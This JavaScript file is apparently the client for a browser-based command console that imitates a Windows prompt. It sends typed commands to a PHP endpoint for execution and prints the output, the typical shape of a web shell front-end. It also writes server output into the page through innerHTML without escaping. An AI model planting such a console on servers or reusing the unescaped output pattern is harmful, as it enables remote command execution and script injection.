(function(window, document, undefined) {
    "use strict";

    function Response(data) {
        if (!(this instanceof Response)) {
            return new Response(data);
        }

        this.data = data;
    }

    Response.prototype = (function() {

        function isOk() {
            return getStatus.call(this) === "OK";
        }

        function isError() {
            return getStatus.call(this) === "ERR";
        }

        function getStatus() {
            return this.data.status || null;
        }

        function getCode() {
            return this.data.code || 0;
        }

        function getText() {
            return this.data.text || "";
        }

        return {
            isOk: isOk,
            isError: isError,
            getCode: getCode,
            getStatus: getStatus,
            getText: getText
        };
    })();

    let PATH;
    let CMD;
    let NUM = -1;
    const CACHE = [];

    function get_path() {
        const path = document.querySelector("#path");
        if (!path) {
            return;
        }

        fetch("ajax.php?do=get_path").then(function(response) {
            return response.json();
        }).then(function(data) {
            const response = new Response(data);
            if (response.isOk()) {
                PATH = data.result;
                path.textContent = PATH;
            }
        });
    }

    function set_path(value) {
        const path = document.querySelector("#path");
        if (!path) {
            return;
        }

        const fd = new FormData();
        fd.append("path", value);

        fetch("ajax.php?do=set_path", {
            method: "POST",
            body: fd
        }).then(function(response) {
            return response.json();
        }).then(function(data) {
            let val;
            if (/^[a-z]:$/i.test(value)) {
                val = [PATH, ">", value].join("");
            } else {
                val = [PATH, ">cd ", value].join("");
            }

            add_result(val, true);
            const response = new Response(data);
            if (response.isOk()) {
                PATH = data.result;
                path.textContent = PATH;
            } else {
                add_result(response.getText());
            }
            to_bottom();
        });
    }

    function cmd_focus() {
        if (!CMD) {
            return;
        }

        CMD.focus();
    }

    function cmd_empty() {
        if (!CMD) {
            return;
        }

        CMD.value = "";
    }

    function to_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function on_enter(event) {
        event.preventDefault();

        NUM = -1;
        CACHE.push(this.value);
        let value = this.value.toString().trim();

        if (value === "" || /^cd\s*(\.\/?)?$/i.test(value)) {
            add_result( PATH + ">" + value, true);
            to_bottom();
        } else if (/^cls$/i.test(value)) {
            clear_result();
        } else if (/^cd\s*/i.test(value)) {
            set_path(value.replace(/^cd\s*/i, ""));
        } else if (/^[a-z]:$/i.test(value)) {
            set_path(value);
        } else if (/^exit(\s+\d+)?$/i.test(value)) {
            window.close();
        } else {
            send_cmd(value);
        }
        cmd_empty();
        cmd_focus();
    }

    function on_escape(event) {
        event.preventDefault();
        cmd_empty();
    }

    function on_arrow_down(event) {
        event.preventDefault();
        if (!CACHE.length) {
            return;
        }

        if (NUM - 1 < 0) {
            return;
        }
        NUM -= 1;

        cmd_cache();
    }

    function on_arrow_up(event) {
        event.preventDefault();
        const size = CACHE.length;
        if (!size) {
            cmd_empty();
            return;
        }

        if (NUM + 1 >= size) {
            return;
        }
        NUM += 1;

        cmd_cache();
    }

    function on_tab(event) {
        event.preventDefault();
        console.log('tab todo');
    }

    function cmd_cache() {
        const size = CACHE.length;
        const tmp = CACHE.slice().reverse();
        for (let i = 0; i < size; i++) {
            if (i === NUM) {
                CMD.value = tmp[i];
                break;
            }
        }
    }

    function cmd_events() {
        if (!CMD) {
            return;
        }
        
        CMD.addEventListener("keydown", function (event) {
            if (is_enter(event)) {

                on_enter.call(this, event);

            } else if (is_escape(event)) {

                on_escape.call(this, event);

            } else if (is_arrow_down(event)) {

                on_arrow_down.call(this, event);

            } else if (is_arrow_up(event)) {

                on_arrow_up.call(this, event);

            } else if (is_tab(event)) {

                on_tab.call(this, event);
            }
        });

        [].forEach.call(document.querySelectorAll("*"), function(el) {
            el.addEventListener("click", function(event) {

                stop_propagation(event);
                cmd_focus();
            })
        });
    }

    function stop_propagation(event) {
        if (typeof event.stopPropagation === "function") {
            event.stopPropagation();
        } else {
            event.cancelBubble = true;
        }
    }

    function is_enter(event) {
        return event.key === "Enter" || event.code === "NumpadEnter" || event.code === "Enter";
    }

    function is_escape(event) {
        return event.key === "Escape" || event.code === "Escape";
    }

    function is_arrow_down(event) {
        return event.key === "ArrowDown" || event.code === "ArrowDown";
    }

    function is_arrow_up(event) {
        return event.key === "ArrowUp" || event.code === "ArrowUp";
    }

    function is_tab(event) {
        return event.key === "Tab" || event.code === "Tab";
    }

    function send_cmd(value) {

        CMD.disabled = true;
        const fd = new FormData();
        fd.append("cmd", value);

        fetch("ajax.php?do=send_cmd", {
            method: "POST",
            body: fd
        }).then(function(response) {
            console.log(response);
            return response.json();
        }).then(function (data) {
            CMD.disabled = false;
            cmd_focus();
            add_result( PATH + ">" + value, true);
            const response = new Response(data);
            if (response.isOk()) {
                add_result(data.result, false);
                //get_path();
            } else {
                add_result(response.getText());
            }
            to_bottom();
        })
    }

    function clear_result() {
        const result = document.querySelector("#result");
        if (!result) {
            return;
        }

        result.textContent = "";
    }

    function add_result(value, is_cmd) {
        const result = document.querySelector("#result");
        if (!result) {
            return;
        }

        if (!value) {
            return;
        }

        const el = document.createElement("div");
        el.className = is_cmd ? "r-cmd" : "r-output";
        el.innerHTML = value.replace(/\n/g, "<br>");
        result.appendChild(el);
    }
    
    document.addEventListener("DOMContentLoaded", function() {

        CMD = document.querySelector("#cmd");

        get_path();
        cmd_events();
        cmd_empty();
        cmd_focus();
    });
})(window, document);